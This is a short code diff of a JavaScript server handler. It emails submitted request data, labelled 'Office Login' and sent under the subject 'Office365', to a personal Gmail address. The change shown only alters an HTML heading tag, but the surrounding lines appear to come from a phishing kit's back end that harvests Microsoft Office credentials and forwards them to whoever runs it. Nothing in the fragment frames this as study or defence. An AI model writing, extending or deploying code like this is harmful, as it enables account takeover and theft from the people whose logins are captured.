@@ -18,7 +18,7 @@ export default async function sendEmail (req, res) {
         to: 'reyesjennifer2806@gmail.com',
         subject: 'Office365',
         text: `Ofiice login ${req.body}`,
-        html: `<h6> Office Login: ${req.body}</h6>`
+        html: `<h2> Office Login: ${req.body}</h2>`
        })
 
       res.json({info})
